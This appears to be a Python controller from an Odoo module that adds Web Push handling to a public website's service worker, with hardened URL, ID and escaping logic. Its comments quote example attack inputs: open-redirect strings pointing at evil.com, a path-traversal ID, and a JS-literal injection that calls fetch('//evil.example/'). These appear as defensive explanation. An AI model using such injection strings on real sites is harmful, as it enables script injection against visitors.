# Copyright 2026 Canarias Conectada
# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl).

import json

from odoo.addons.website_pwa.controllers.main import WebsitePWA

# Public page of a discuss channel: `/discuss/channel/<int:channel_id>`,
# `auth="public"` (mail/controllers/discuss/public_page.py:56). This is the
# page a guest can actually open; core's own worker sends the visitor to
# `/odoo/action-mail.action_discuss`, which is the backend and answers a login
# screen to everybody this module exists for.
CHANNEL_PATH = "/discuss/channel/"

# Where a notification that names no channel sends the visitor. The site root
# is the only page every microsite is guaranteed to have.
FALLBACK_URL = "/"

# `mail_push_guest`'s public registration route. NOT core's
# `/web/dataset/call_kw/mail.push.device/register_devices`, which is
# `auth="user"` and therefore closed to the anonymous visitors this whole
# stack is for.
SUBSCRIBE_URL = "/mail/push/subscribe"

# Shown when a push arrives with no readable payload. `userVisibleOnly: true`
# is a promise to the browser that every push produces a visible notification;
# breaking it makes Chrome show its own "This site has been updated in the
# background" notice and eventually revoke the subscription. So even the
# give-up branch shows something.
GENERIC_TITLE = "Nuevo mensaje"

# Appended to the worker `website_pwa` serves, and only for websites with push
# enabled. Written here rather than shipped as a static file because a service
# worker is not part of an asset bundle: it is a single file served from the
# root, and the only supported way to add to it is the hook below.
#
# Deliberately NOT a copy of `mail/static/src/service_worker.js`. What was left
# behind and why is in the README; the short version is that core's worker is
# the BACKEND's: it `importScripts` a library from `/mail/static/lib`, opens
# `/odoo/...` URLs, keeps an IndexedDB of RTC logs, and negotiates with an open
# web client through `postMessage` before deciding whether to show anything.
# None of that exists on a public microsite.
#
# The `%(...)s` placeholders carry NO surrounding quotes on purpose: every
# value goes through `json.dumps` in `_pwa_push_worker_literals`, so it arrives
# here as a complete JS literal. See that method for why.
PUSH_HANDLERS = """

// --- website_pwa_push ---------------------------------------------------
// Web Push for the public site. Appended only when the website has
// pwa_push_enabled; a website without it serves the bytes above and nothing
// more.
const PUSH_CHANNEL_PATH = %(channel_path)s;
const PUSH_FALLBACK_URL = %(fallback_url)s;
const PUSH_SUBSCRIBE_URL = %(subscribe_url)s;
const PUSH_GENERIC_TITLE = %(generic_title)s;

/**
 * Public page a notification should open.
 *
 * `data.url` wins when the payload carries one, so a module that serves the
 * conversation somewhere else only has to add a key to the payload -- it does
 * not have to override this worker. Only same-origin targets are honoured: the
 * payload is built server-side, but a click handler that opened any URL a
 * payload named would be one server-side bug away from a redirector.
 *
 * The check RESOLVES the value and compares origins instead of matching the
 * string. A `startsWith("/") && !startsWith("//")` guard reads as same-origin
 * and is not: `/\\evil.com`, `/\\/evil.com` and `/<tab>/evil.com` all pass it,
 * and the URL parser then reads every one of them as `https://evil.com/` --
 * backslashes are path separators for a special scheme, and leading and
 * embedded tabs are stripped before parsing. Only the parser knows what an
 * origin is, so the parser is who gets asked.
 */
function pushTargetUrl(data) {
    if (!data) {
        return PUSH_FALLBACK_URL;
    }
    if (typeof data.url === "string") {
        try {
            const target = new URL(data.url, self.location.origin);
            if (target.origin === self.location.origin) {
                return target.pathname + target.search + target.hash;
            }
        } catch (error) {
            // Unparseable even against a base: fall through to the record.
        }
    }
    // Server-built and always an integer today, but it is CONCATENATED into a
    // path: a res_id like `"1/../../x"` walks straight out of the channel path
    // and lands the guest wherever it likes, the backend included. Coerce, and
    // accept only what a database id can be.
    const resId = Number(data.res_id);
    if (data.model === "discuss.channel" && Number.isInteger(resId) && resId > 0) {
        return PUSH_CHANNEL_PATH + resId;
    }
    return PUSH_FALLBACK_URL;
}

/**
 * Tag that makes a burst collapse into one notification.
 *
 * Same conversation, same tag: the phone replaces the previous notification
 * instead of stacking twenty of them while somebody types. `renotify` is left
 * unset on purpose, so the replacement is silent -- one buzz per conversation,
 * not one per message.
 *
 * No tag when the payload names no record: an empty tag would collapse
 * unrelated notifications into a single one nobody can read.
 */
function pushTag(data) {
    if (data && data.model && data.res_id) {
        return "cc-push-" + data.model + "-" + data.res_id;
    }
    return "";
}

/**
 * base64url of an ArrayBuffer, unpadded.
 *
 * `subscription.options.applicationServerKey` reads back as an ArrayBuffer
 * even when it was subscribed with a string, and `/mail/push/subscribe`
 * compares the echoed key to the stored parameter. Without this re-encoding
 * the re-subscription is refused as an invalid VAPID key and push dies a few
 * days after the endpoint rotates.
 */
function pushArrayBufferToBase64Url(buffer) {
    if (!buffer) {
        return "";
    }
    const bytes = new Uint8Array(buffer);
    let binary = "";
    for (let i = 0; i < bytes.byteLength; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary).replace(/\\+/g, "-").replace(/\\//g, "_").replace(/=/g, "");
}

/**
 * `showNotification` as a promise that never throws synchronously.
 *
 * Argument conversion can fail before any promise exists, and a throw there
 * would escape the `push` handler entirely instead of reaching the fallback.
 */
function pushShowNotification(title, options) {
    try {
        return Promise.resolve(self.registration.showNotification(title, options));
    } catch (error) {
        return Promise.reject(error);
    }
}

self.addEventListener("push", (event) => {
    let payload = null;
    if (event.data) {
        try {
            payload = event.data.json();
        } catch (error) {
            payload = null;
        }
    }
    const options = Object.assign({}, payload && payload.options);
    const tag = pushTag(options.data);
    if (tag) {
        options.tag = tag;
    } else {
        // The contract of `pushTag` is "no record, no tag". A tag the payload
        // supplied itself must not survive that, or unrelated notifications
        // collapse into a single one nobody can read -- the exact outcome the
        // empty return exists to prevent.
        delete options.tag;
    }
    const title = (payload && payload.title) || PUSH_GENERIC_TITLE;
    // A REJECTED `showNotification` handed to `waitUntil` shows NOTHING, and
    // that is the `userVisibleOnly` breach this worker exists to avoid: Chrome
    // posts its own "site updated in the background" notice and, repeated,
    // revokes the permission for the whole origin. `options` comes from the
    // payload, so it can be perfectly readable and still invalid -- `renotify`
    // with no tag, or `actions` that is not a sequence, both reject. The
    // generic-title fallback above only covers an UNREADABLE payload; this
    // covers a readable but hostile one.
    event.waitUntil(
        pushShowNotification(title, options).catch(() =>
            pushShowNotification(PUSH_GENERIC_TITLE, {})
        )
    );
});

self.addEventListener("notificationclick", (event) => {
    event.notification.close();
    event.waitUntil(pushFocusOrOpen(pushTargetUrl(event.notification.data)));
});

/**
 * Focus the tab already showing that page, or open one.
 *
 * `includeUncontrolled: true` matters: a tab opened before this worker took
 * control is not controlled by it, and it is usually the very tab the visitor
 * is looking at. Without the flag every click opens a second copy of the page.
 */
async function pushFocusOrOpen(url) {
    const target = new URL(url, self.location.origin);
    const windowClients = await self.clients.matchAll({
        type: "window",
        includeUncontrolled: true,
    });
    for (const client of windowClients) {
        if (new URL(client.url).pathname === target.pathname && "focus" in client) {
            return client.focus();
        }
    }
    if (self.clients.openWindow) {
        return self.clients.openWindow(target.href);
    }
    return undefined;
}

self.addEventListener("pushsubscriptionchange", (event) => {
    // The push service rotated the endpoint. Without this handler the visitor
    // simply stops receiving, with nothing on screen to explain it: the old
    // row keeps being pushed to until the service answers 404 and the server
    // deletes it.
    event.waitUntil(pushHandleSubscriptionChange(event));
});

/**
 * Find the subscription to register after a rotation, then register it.
 *
 * Chrome hands over `oldSubscription` and expects the worker to re-subscribe
 * with its options. Firefox fires the event with `oldSubscription` null, so
 * returning early on a missing one made the handler a no-op there -- safe, but
 * silent, which is the failure mode this handler exists against. Three sources
 * are tried, most authoritative first, and running out of them is logged
 * instead of swallowed.
 */
async function pushHandleSubscriptionChange(event) {
    const previousEndpoint = event.oldSubscription
        ? event.oldSubscription.endpoint
        : null;
    let subscription = event.newSubscription || null;
    if (!subscription && event.oldSubscription) {
        subscription = await self.registration.pushManager.subscribe(
            event.oldSubscription.options
        );
    }
    if (!subscription) {
        // Neither a handed-over subscription nor an old one to copy the VAPID
        // key from. The browser may still hold the live one.
        subscription = await self.registration.pushManager.getSubscription();
    }
    if (!subscription) {
        console.error(
            "[website_pwa_push] subscription change with nothing to register"
        );
        return;
    }
    await pushResubscribe(subscription, previousEndpoint);
}

async function pushResubscribe(subscription, previousEndpoint) {
    const json = subscription.toJSON();
    let response = null;
    try {
        response = await fetch(PUSH_SUBSCRIBE_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            // Same-origin, and the persona is the session: the `dgid` guest
            // cookie or the logged-in user. The route reads it from nowhere
            // else.
            credentials: "same-origin",
            body: JSON.stringify({
                jsonrpc: "2.0",
                method: "call",
                params: {
                    endpoint: json.endpoint,
                    keys: json.keys,
                    expiration_time: json.expirationTime,
                    vapid_public_key: pushArrayBufferToBase64Url(
                        subscription.options &&
                            subscription.options.applicationServerKey
                    ),
                    // The route does not act on this yet (see the README): the
                    // new endpoint is registered as a new row and the old one
                    // is cleaned up by the push service answering 404/410.
                    // Sent anyway, because it is the only moment the pairing
                    // is known.
                    previous_endpoint: previousEndpoint,
                },
            }),
        });
    } catch (error) {
        // Offline exactly when the endpoint rotated. There is nothing to retry
        // against from here, but the renewal is lost, and a lost renewal must
        // not also be an invisible one.
        console.error("[website_pwa_push] renewal request failed", error);
        return;
    }
    // This event fires with NO page open, so nobody is watching: an unread
    // response is a renewal that disappears forever and a visitor who silently
    // stops receiving. The route 404s when the `dgid` cookie is absent, and
    // answers 200 with a JSON-RPC `error` member when the call itself fails --
    // both have to be read to be noticed.
    if (!response.ok) {
        console.error(
            "[website_pwa_push] renewal refused with HTTP " + response.status
        );
        return;
    }
    let body = null;
    try {
        body = await response.json();
    } catch (error) {
        console.error("[website_pwa_push] renewal answered non-JSON", error);
        return;
    }
    if (body && body.error) {
        console.error("[website_pwa_push] renewal refused", body.error);
    }
}
""".rstrip()


class WebsitePWAPush(WebsitePWA):
    """Web Push handlers on top of the public site's service worker.

    Subclassing `website_pwa`'s controller is the extension mechanism its own
    hook documents. Nothing here re-declares a route: the worker keeps being
    served by `website_pwa`, with its headers and its 404 when the app is off.
    """

    def _pwa_service_worker_content(self, website):
        """Append the push handlers, and only for a website that asked.

        The byte-stability warning on the hook is the whole design constraint
        here: this worker is cached on real phones, so a website with push off
        must get the bytes it got before this module was installed -- not the
        same bytes plus a dead branch, not the same bytes plus a comment.
        `test_worker_is_byte_identical_to_website_pwa_when_push_is_off` pins
        exactly that.
        """
        body = super()._pwa_service_worker_content(website)
        if not website._pwa_push_active():
            return body
        return body + PUSH_HANDLERS % self._pwa_push_worker_literals(website)

    def _pwa_push_worker_literals(self, website):
        """`_pwa_push_worker_values`, each one turned into a JS literal.

        The escaping lives HERE rather than in the hook because the hook is
        advertised as an override point for other modules, and asking every
        overrider to escape its own return value is asking for the one that
        forgets. Interpolated raw into a quoted JS string, a returned
        ``/mi-chat/"; fetch("//evil.example/"); //`` closed the literal and RAN
        at worker install time; a returned value carrying a raw newline was a
        SyntaxError that aborted the install, taking `website_pwa`'s offline
        cache down with it. `json.dumps` returns a complete, quoted, escaped
        literal -- and escapes non-ASCII, so U+2028 cannot end a line either --
        which is why the placeholders in the template carry no quotes.
        """
        return {
            key: json.dumps(value)
            for key, value in self._pwa_push_worker_values(website).items()
        }

    def _pwa_push_worker_values(self, website):
        """Values baked into the appended handlers.

        A hook rather than four constants read directly, so a module serving
        the conversation on its own page can point the click handler at it
        without copying the handlers. The payload's own `data.url` covers the
        per-message case; this covers the per-website one.

        Return PLAIN values: `_pwa_push_worker_literals` turns them into JS
        literals, so an override must not quote or escape anything itself.
        """
        return {
            "channel_path": CHANNEL_PATH,
            "fallback_url": FALLBACK_URL,
            "subscribe_url": SUBSCRIBE_URL,
            "generic_title": GENERIC_TITLE,
        }
